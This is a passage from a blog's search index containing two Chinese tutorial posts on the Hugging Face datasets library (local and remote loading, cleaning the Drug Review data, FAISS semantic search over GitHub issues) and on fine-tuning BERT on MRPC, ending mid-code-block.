<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>「HFLLM」5-数据集</title>
      <link href="/2025/05/02/5-%E6%95%B0%E6%8D%AE%E9%9B%86/"/>
      <url>/2025/05/02/5-%E6%95%B0%E6%8D%AE%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1>1 加载hf上没有的数据集</h1><p>对于每种数据格式，只需要在<code>load_dataset（）</code>函数中指定加载脚本的类型，以及指定一个或多个文件路径的<code>data_files</code>参数。</p><p><img src="image_JPzds9EmIs.png" alt=""></p><p>以下为加载在github上管理的数据集进行演示，首先下载数据集：</p><p><img src="image_6gm2_ZFPY_.png" alt=""></p><p>解压数据集：</p><p><img src="image_OfHJUVtiqq.png" alt=""></p><p>安装<code>datasets</code>库：</p><p><img src="image_yh2ld1sEoD.png" alt=""></p><p>加载数据集：</p><p><img src="image_OAYbQqwsBW.png" alt=""></p><p>查看数据集：</p><p><img src="image_C_zMXzTqkA.png" alt=""></p><p>也可以使用以下方式加载数据集：</p><p><img src="image_ORLhuP0AMm.png" alt=""></p><p>如果数据集很有可能存储在某个远程服务器上，可以使用以下方式进行加载：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;https://github.com/crux82/squad-it/raw/master/&quot;</span></span><br><span class="line">data_files = &#123;</span><br><span class="line">    <span class="string">&quot;train&quot;</span>: url + <span class="string">&quot;SQuAD_it-train.json.gz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;test&quot;</span>: url + <span class="string">&quot;SQuAD_it-test.json.gz&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">squad_it_dataset = load_dataset(<span class="string">&quot;json&quot;</span>, data_files=data_files, field=<span class="string">&quot;data&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h1>2 对数据集进行分片和切块</h1><p>首先加载要处理的数据集，将使用托管在<a href="https://archive.ics.uci.edu/ml/index.php" title="UC Irvine Machine Learning Repository">UC Irvine Machine Learning Repository</a>上的<a href="https://archive.ics.uci.edu/ml/datasets/Drug+Review+Dataset+(Drugs.com)" title="药物审查数据集">药物审查数据集</a>，其中包含患者对各种药物的评论，以及正在治疗的病情和患者满意度的 10 星评级。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!wget <span class="string">&quot;https://archive.ics.uci.edu/ml/machine-learning-databases/00462/drugsCom_raw.zip&quot;</span></span><br><span class="line">!unzip drugsCom_raw.zip</span><br><span class="line"></span><br><span class="line">from datasets import load_dataset</span><br><span class="line"></span><br><span class="line">data_files = &#123;<span class="string">&quot;train&quot;</span>: <span class="string">&quot;drugsComTrain_raw.tsv&quot;</span>, <span class="string">&quot;test&quot;</span>: <span class="string">&quot;drugsComTest_raw.tsv&quot;</span>&#125;</span><br><span class="line"><span class="comment"># \t is the tab character in Python</span></span><br><span class="line">drug_dataset = load_dataset(<span class="string">&quot;csv&quot;</span>, data_files=data_files, delimiter=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建数据集的一个随机样本进行查看：</p><p><img src="image__OGrWoz41c.png" alt=""></p><p>将<code>Unnamed：0</code>列重命名为更易于解释的名称来稍微清理数据集。可以使用<code>DatasetDict.rename_column()</code>函数一次性重命名两个分片中的列：</p><p><img src="image_ta7rorCIzR.png" alt=""></p><p>删除condition中为None的行：</p><p><img src="image_wqhwvVfHgl.png" alt=""></p><p>删除<code>None</code>条目后，可以将<code>condition</code>列转化为小写：</p><p><img src="image_JqQf4_bOan.png" alt=""></p><h2 id="2-1-创建新列">2.1 创建新列</h2><p>目标删除少于30个单词的评论，首先统计每个评论的字数：</p><p><img src="image__TSW7a2PVM.png" alt=""></p><p>删除较少字数的评论：</p><p><img src="image_dv8X2LZQ0z.png" alt=""></p><p>添加<code>batched</code>参数会加速很多：</p><p><img src="image_wTv6XLGxXv.png" alt=""></p><h2 id="2-2-从datasets到dataframe">2.2 从Datasets到DataFrame</h2><p>为了实现各种第三方库之间的转换，🤗 Datasets 提供了<code>Dataset.set_format（）</code>函数。此功能仅更改数据集<em>的输出格式</em>，因此您可以轻松切换到另一种格式，而不会影响底层<em>数据格式</em>，即 Apache Arrow。格式设置已就地完成。</p><p>将数据集转换为Pandas：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drug_dataset.set_format(<span class="string">&quot;pandas&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="image_sUDi_txaNE.png" alt=""></p><p>之后可以使用任何Pandas功能：</p><p><img src="image_l5-zJuHSER.png" alt=""></p><p>完成 Pandas 分析后，可以使用<code>Dataset.from_pandas()</code>函数创建新的<code>Dataset</code>对象，如下所示：</p><p><img src="image_UUxpAW8nCo.png" alt=""></p><h2 id="2-3-创建验证集">2.3 创建验证集</h2><p>Datasets 提供了一个<code>Dataset.train_test_split()</code>函数，该函数基于<code>scikit-learn</code>中的著名功能。用它来将训练集拆分为<code>train</code>和<code>validation</code>split（设置<code>seed</code>参数以实现可重复性）：</p><p><img src="image_zb3OQSnqez.png" alt=""></p><p>如下表所示，🤗 Datasets 提供了三个主要功能来以不同格式保存数据集：</p><p><img src="image_aia2POYK5F.png" alt=""></p><p>保存数据集后，可以使用<code>load_from_disk()</code>函数加载它，如下所示：</p><p><img src="image_KudevBia9M.png" alt=""></p><hr><h1>3 使用FAISS进行语义检索</h1><h2 id="3-1-加载和准备数据集">3.1 加载和准备数据集</h2><p>GitHub Issues 是一个数据集，由 GitHub 问题和与 Datasets<a href="https://github.com/huggingface/datasets" title="存储库">存储库</a>关联的拉取请求组成。它旨在用于教育目的，可用于语义搜索或多标签文本分类。</p><p><img src="image_Gwq4WHHEmV.png" alt=""></p><p>之后过滤pr以及没有comment的数据，如下：</p><p><img src="image_Gv2ITaJS_7.png" alt=""></p><p>数据集中有很多列，其中大部分我们不需要构建我们的搜索引擎。从搜索的角度来看，信息量最大的列是<code>title</code>、<code>body</code>和<code>comments</code>，而<code>html_url</code>提供了一个返回源问题的链接。使用<code>Dataset.remove_columns()</code>函数来删除其余部分：</p><p><img src="image_WzSjhv3JtN.png" alt=""></p><p>每条数据中的comments是一个列表，包含多个评论，这里将每个评论都分解出来，增加数据量。首先将数据转换为pandas格式：</p><p><img src="image_oO35_Orza2.png" alt=""></p><p>之后使用<code>explode</code>方法进行拆分：</p><p><img src="image_nHgU4NxuXf.png" alt=""></p><p>第一行代码 <code>comments_df = df.explode(&quot;comments&quot;, ignore_index=True)</code> 的作用是对 DataFrame (<code>df</code>) 中的某一列（这里是 <code>&quot;comments&quot;</code> 列）进行展开操作。</p><p><code>explode</code> 是 Pandas 提供的一个方法，用于将列表类型的元素拆分成多行。假设 <code>&quot;comments&quot;</code> 列中的每个单元格存储的是一个列表（例如：<code>[&quot;评论1&quot;, &quot;评论2&quot;, &quot;评论3&quot;]</code>），那么 <code>explode</code> 方法会将这个列表中的每个元素变成单独的一行，同时保留其他列的值不变。</p><p>假设原始 DataFrame (<code>df</code>) 的结构如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| index | post<span class="emphasis">_id | comments                  |</span></span><br><span class="line"><span class="emphasis">|-------|---------|---------------------------|</span></span><br><span class="line"><span class="emphasis">| 0     | 1       | [&quot;评论1&quot;, &quot;评论2&quot;]        |</span></span><br><span class="line"><span class="emphasis">| 1     | 2       | [&quot;评论3&quot;, &quot;评论4&quot;, &quot;评论5&quot;] |</span></span><br></pre></td></tr></table></figure><p>执行 <code>explode(&quot;comments&quot;)</code> 后，<code>&quot;comments&quot;</code> 列中的每个列表元素会被拆分成多行，结果如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| index | post<span class="emphasis">_id | comments |</span></span><br><span class="line"><span class="emphasis">|-------|---------|----------|</span></span><br><span class="line"><span class="emphasis">| 0     | 1       | 评论1    |</span></span><br><span class="line"><span class="emphasis">| 1     | 1       | 评论2    |</span></span><br><span class="line"><span class="emphasis">| 2     | 2       | 评论3    |</span></span><br><span class="line"><span class="emphasis">| 3     | 2       | 评论4    |</span></span><br><span class="line"><span class="emphasis">| 4     | 2       | 评论5    |</span></span><br></pre></td></tr></table></figure><p>如果设置了 <code>ignore_index=True</code>，索引会被重新排列为连续的整数：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| index | post<span class="emphasis">_id | comments |</span></span><br><span class="line"><span class="emphasis">|-------|---------|----------|</span></span><br><span class="line"><span class="emphasis">| 0     | 1       | 评论1    |</span></span><br><span class="line"><span class="emphasis">| 1     | 1       | 评论2    |</span></span><br><span class="line"><span class="emphasis">| 2     | 2       | 评论3    |</span></span><br><span class="line"><span class="emphasis">| 3     | 2       | 评论4    |</span></span><br><span class="line"><span class="emphasis">| 4     | 2       | 评论5    |</span></span><br></pre></td></tr></table></figure><h2 id="3-2-创建文本嵌入">3.2 创建文本嵌入</h2><p><code>sentence-transformers</code>的库，专门用于创建嵌入向量。文档中方便的<a href="https://www.sbert.net/docs/pretrained_models.html#model-overview" title="模型概述表">模型概述表</a>表明，<code>multi-qa-mpnet-base-dot-v1</code>检查点在语义搜索方面具有最佳性能。</p><p>首先加载模型：</p><p><img src="image_0OqvIDBNJF.png" alt=""></p><p>将模型移动到GPU上：</p><p><img src="image_NEGVO94AG_.png" alt=""></p><p>将第一条数据送入模型进行嵌入：</p><p><img src="image_mwBsLoiXHK.png" alt=""></p><p>以此类推，将所有数据都使用上述方式进行嵌入：</p><p><img src="image_BO3BJTcVgU.png" alt=""></p><h2 id="3-3-使用faiss进行高效的相似性搜索">3.3 使用FAISS进行高效的相似性搜索</h2><p><a href="https://faiss.ai/" title="FAISS">FAISS</a>（Facebook AI Similarity Search 的缩写）是一个库，可提供高效的算法来快速搜索和聚类嵌入向量。FAISS 背后的基本思想是创建一种称为<em>索引</em>的特殊数据结构，它允许人们找到哪些嵌入与输入嵌入相似。</p><p>在 Datasets 中创建 FAISS 索引很简单，使用<code>Dataset.add_faiss_index()</code>函数并指定要索引的数据集的哪一列。</p><p><img src="image_XCQ0iBJbaE.png" alt=""></p><p>在构建faiss索引时，要求先安装faiss库，但是明明已经下载了，并且可以成功导入faiss库，但是在添加faiss索引时还是报错显示要安装。</p><p><img src="image_ky2jSBHuch.png" alt=""></p><p>最后找到一个解决方法：重启会话，然后先安装faiss库，之后再构建faiss索引即可成功：</p><p><img src="image_vWXPh8j6Ne.png" alt=""></p><p>现在，可以通过使用该<code>Dataset.get_nearest_examples()</code>函数执行最近邻查找来对此索引执行查询。首先嵌入一个问题来测试一下，如下所示：</p><p><img src="image_1kWST1i35y.png" alt=""></p><p><code>Dataset.get_nearest_examples()</code>函数返回一个分数元组，用于对查询和文档之间的重叠进行排名，以及一组相应的样本（此处为 5 个最佳匹配项）。</p><p><img src="image_LqGK3vRncN.png" alt=""></p><p>第一个匹配结果：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">COMMENT: Requiring online connection is a deal breaker in some cases unfortunately so it&#x27;d be great if offline mode is added similar to how <span class="code">`transformers`</span> loads models offline fine.</span><br><span class="line"></span><br><span class="line">@mandubian&#x27;s second bullet point suggests that there&#x27;s a workaround allowing you to use your offline (custom?) dataset with <span class="code">`datasets`</span>. Could you please elaborate on how that should look like?</span><br><span class="line">SCORE: 25.505016326904297</span><br><span class="line">TITLE: Discussion using datasets in offline mode</span><br><span class="line">URL: https://github.com/huggingface/datasets/issues/824</span><br></pre></td></tr></table></figure><p>可以发现在上述结果中并没有给出如何在本地加载数据集，而是title字段匹配度较高。</p><p>后四个匹配结果：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">COMMENT: The local dataset builders (csv, text , json and pandas) are now part of the <span class="code">`datasets`</span> package since #1726 :)</span><br><span class="line">You can now use them offline</span><br><span class="line"></span><br><span class="line">datasets = load<span class="emphasis">_dataset(&#x27;text&#x27;, data_</span>files=data<span class="emphasis">_files)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">We&#x27;ll do a new release soon</span></span><br><span class="line"><span class="emphasis">SCORE: 24.555538177490234</span></span><br><span class="line"><span class="emphasis">TITLE: Discussion using datasets in offline mode</span></span><br><span class="line"><span class="emphasis">URL: https://github.com/huggingface/datasets/issues/824</span></span><br><span class="line"><span class="emphasis">==================================================</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">COMMENT: I opened a PR that allows to reload modules that have already been loaded once even if there&#x27;s no internet.</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">Let me know if you know other ways that can make the offline mode experience better. I&#x27;d be happy to add them :) </span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">I already note the &quot;freeze&quot; modules option, to prevent local modules updates. It would be a cool feature.</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">----------</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&gt; @mandubian&#x27;s second bullet point suggests that there&#x27;s a workaround allowing you to use your offline (custom?) dataset with `datasets`. Could you please elaborate on how that should look like?</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">Indeed `load_</span>dataset` allows to load remote dataset script (squad, glue, etc.) but also you own local ones.</span><br><span class="line">For example if you have a dataset script at <span class="code">`./my_dataset/my_dataset.py`</span> then you can do</span><br><span class="line"></span><br><span class="line">load<span class="emphasis">_dataset(&quot;./my_</span>dataset&quot;)</span><br><span class="line"></span><br><span class="line">and the dataset script will generate your dataset once and for all.</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">About I&#x27;m looking into having <span class="code">`csv`</span>, <span class="code">`json`</span>, <span class="code">`text`</span>, <span class="code">`pandas`</span> dataset builders already included in the <span class="code">`datasets`</span> package, so that they are available offline by default, as opposed to the other datasets that require the script to be downloaded.</span><br><span class="line">cf #1724 </span><br><span class="line">SCORE: 24.14898681640625</span><br><span class="line">TITLE: Discussion using datasets in offline mode</span><br><span class="line"><span class="section">URL: https://github.com/huggingface/datasets/issues/824</span></span><br><span class="line"><span class="section">==================================================</span></span><br><span class="line"></span><br><span class="line">COMMENT: &gt; here is my way to load a dataset offline, but it <span class="strong">**requires**</span> an online machine</span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; 1. (online machine)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; import datasets</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; data = datasets.load<span class="emphasis">_dataset(...)</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; data.save_</span>to<span class="emphasis">_disk(/YOUR/DATASET/DIR)</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; 2. copy the dir from online to the offline machine</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; 3. (offline machine)</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; import datasets</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; data = datasets.load_</span>from<span class="emphasis">_disk(/SAVED/DATA/DIR)</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; </span></span></span><br><span class="line"><span class="emphasis"><span class="quote">&gt; HTH.</span></span></span><br><span class="line"><span class="emphasis"><span class="quote"></span></span></span><br><span class="line"><span class="emphasis"><span class="quote">SCORE: 22.89400291442871</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">TITLE: Discussion using datasets in offline mode</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">URL: https://github.com/huggingface/datasets/issues/824</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">==================================================</span></span></span><br><span class="line"><span class="emphasis"><span class="quote"></span></span></span><br><span class="line"><span class="emphasis"><span class="quote">COMMENT: here is my way to load a dataset offline, but it <span class="strong">**requires**</span> an online machine</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">1. (online machine)</span></span></span><br><span class="line"><span class="emphasis"><span class="quote"></span></span></span><br><span class="line"><span class="emphasis"><span class="quote">import datasets</span></span></span><br><span class="line"><span class="emphasis"><span class="quote">data = datasets.load_</span>dataset(...)</span></span><br><span class="line">data.save<span class="emphasis">_to_</span>disk(/YOUR/DATASET/DIR)</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> copy the dir from online to the offline machine</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> (offline machine)</span><br><span class="line"></span><br><span class="line">import datasets</span><br><span class="line">data = datasets.load<span class="emphasis">_from_</span>disk(/SAVED/DATA/DIR)</span><br><span class="line"></span><br><span class="line">HTH.</span><br><span class="line">SCORE: 22.40665626525879</span><br><span class="line">TITLE: Discussion using datasets in offline mode</span><br><span class="line"><span class="section">URL: https://github.com/huggingface/datasets/issues/824</span></span><br><span class="line"><span class="section">==================================================</span></span><br></pre></td></tr></table></figure><p>可以发现后面几个结果基本都给出了从本地加载数据集的代码，效果不错。</p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「HFLLM」3. 微调预训练模型</title>
      <link href="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/"/>
      <url>/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1 介绍"></a>1 介绍</h1><p>本章将学习：</p><ol><li>如何从 Hub 准备大型数据集</li><li>如何使用高级<code>Trainer</code>API 微调模型</li><li>如何使用自定义训练循环</li><li>如何利用 🤗 Accelerate 库在任何分布式设置上轻松运行自定义训练循环</li></ol><hr><h1 id="2-处理数据"><a href="#2-处理数据" class="headerlink" title="2 处理数据"></a>2 处理数据</h1><p>以下是如何在 PyTorch 中的一个批次上训练序列分类器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> AdamW</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForSequenceClassification</span><br><span class="line"></span><br><span class="line"><span class="comment"># Same as before</span></span><br><span class="line">checkpoint = <span class="string">&quot;bert-base-uncased&quot;</span></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(checkpoint)</span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(checkpoint)</span><br><span class="line">sequences = [</span><br><span class="line">    <span class="string">&quot;I&#x27;ve been waiting for a HuggingFace course my whole life.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;This course is amazing!&quot;</span>,</span><br><span class="line">]</span><br><span class="line">batch = tokenizer(sequences, padding=<span class="literal">True</span>, truncation=<span class="literal">True</span>, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is new</span></span><br><span class="line">batch[<span class="string">&quot;labels&quot;</span>] = torch.tensor([<span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">optimizer = AdamW(model.parameters())</span><br><span class="line">loss = model(**batch).loss</span><br><span class="line">loss.backward()</span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure><p>当然，仅仅用两句话训练模型不会产生非常好的结果。为了获得更好的结果，您需要准备更大的数据集。</p><p>在本节中，我们将使用 William B. Dolan 和 Chris Brockett 在<a href="https://www.aclweb.org/anthology/I05-5002.pdf" title="一篇论文">一篇论文</a>中介绍的 MRPC （Microsoft Research Paraphrase Corpus） 数据集作为示例。该数据集由 5,801 对句子组成，带有一个标签，指示它们是否是释义（即，如果两个句子的含义相同）。我们在本章中选择它，因为它是一个小数据集，因此很容易对其进行训练。</p><h2 id="2-1-从Hub加载数据集"><a href="#2-1-从Hub加载数据集" class="headerlink" title="2.1 从Hub加载数据集"></a>2.1 从Hub加载数据集</h2><p>Hub 不仅包含模型；它还拥有许多不同语言的多个数据集。您可以<a href="https://huggingface.co/datasets" title="在此处">在此处</a>浏览数据集，我们建议您在完成本节后尝试加载和处理新数据集（请参阅<a href="https://huggingface.co/docs/datasets/loading" title="此处">此处</a>的一般文档）。但现在，让我们专注于 MRPC 数据集！这是构成 GLUE 基准测试的 10 个数据集之一，<a href="https://gluebenchmark.com/" title="GLUE 基准测试">GLUE 基准测试</a>是一项学术基准测试，用于衡量 ML 模型在 10 个不同文本分类任务中的性能。</p><p>🤗 数据集库提供了一个非常简单的命令，用于在 Hub 上下载和缓存数据集。我们可以像这样下载 MRPC 数据集：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line"></span><br><span class="line">raw_datasets = load_dataset(<span class="string">&quot;glue&quot;</span>, <span class="string">&quot;mrpc&quot;</span>)</span><br><span class="line">raw_datasets</span><br></pre></td></tr></table></figure><p>这里在colab中进行测试，运行结果如下：</p><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_FhPlOGL6Xo.png"></p><p>如你所见，我们得到了一个<code>DatasetDict</code>对象，其中包含训练集、验证集和测试集。每个都包含几列（<code>sentence1</code>、<code>sentence2</code>、<code>label</code>和<code>idx</code>）和可变数量的行，即每个集中的元素数（因此，训练集中有 3,668 对句子，验证集中有 408 对，测试集中有 1,725 对）。</p><p>此命令默认在*~&#x2F;.cache&#x2F;huggingface&#x2F;datasets*中下载并缓存数据集。回想一下第 2 章，您可以通过设置<code>HF_HOME</code>环境变量来自定义缓存文件夹。</p><p>我们可以通过索引来访问<code>raw_datasets</code>对象中的每对句子，就像使用字典一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raw_train_dataset = raw_datasets[<span class="string">&quot;train&quot;</span>]</span><br><span class="line">raw_train_dataset[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_qKsDCKZurG.png"></p><p>我们可以看到标签已经是整数，因此我们不必在那里进行任何预处理。要知道哪个整数对应哪个标签，我们可以检查<code>raw_train_dataset</code>的特征。这将告诉我们每列的类型：</p><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_yD3PNkpXGD.png"></p><p>在后台，<code>label</code>的类型为<code>ClassLabel</code>，整数到标签 name 的映射存储在<em>names</em>文件夹中。<code>0</code>对应于<code>not_equivalent，1</code>对应于<code>等效</code>。</p><h2 id="2-2-预处理数据集"><a href="#2-2-预处理数据集" class="headerlink" title="2.2 预处理数据集"></a>2.2 预处理数据集</h2><p>要预处理数据集，我们需要将文本转换为模型可以理解的数字。正如您在<a href="https://huggingface.co/course/chapter2" title="上一章">上一章</a>中看到的，这是使用 tokenizer 完成的。我们可以给分词器一个句子或一个句子列表，这样我们就可以直接对每对的所有第一句和所有第二句进行分词，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"></span><br><span class="line">checkpoint = <span class="string">&quot;bert-base-uncased&quot;</span></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(checkpoint)</span><br><span class="line">tokenized_sentences_1 = tokenizer(raw_datasets[<span class="string">&quot;train&quot;</span>][<span class="string">&quot;sentence1&quot;</span>])</span><br><span class="line">tokenized_sentences_2 = tokenizer(raw_datasets[<span class="string">&quot;train&quot;</span>][<span class="string">&quot;sentence2&quot;</span>])</span><br></pre></td></tr></table></figure><p>但是，我们不能只将两个序列传递给模型并预测这两个句子是否是释义。我们需要将这两个序列作为一对处理，并应用适当的预处理。幸运的是，分词器还可以采用一对序列，并按照我们的 BERT 模型期望的方式进行准备：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inputs = tokenizer(<span class="string">&quot;This is the first sentence.&quot;</span>, <span class="string">&quot;This is the second one.&quot;</span>)</span><br><span class="line">inputs</span><br></pre></td></tr></table></figure><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_BoQ8maEDOt.png"></p><p>之前讨论了<code>input_ids</code>键和<code>attention_mask</code>键，但我们推迟了讨论<code>token_type_ids</code>。在此示例中，这是告诉模型输入的哪一部分是第一句话，哪一部分是第二句话。</p><p>如果我们将<code>input_ids</code>中的 ID 解码回单词：</p><p><img src="/2025/05/01/3-%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/image_KQEj_HJAfs.png"></p><p>所以我们看到模型期望输入是当有两个句子<code>[CLS] sentence1 [SEP] sentence2 [SEP]</code>时的形式。将此与<code>token_type_ids</code>保持一致，我们可以得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span 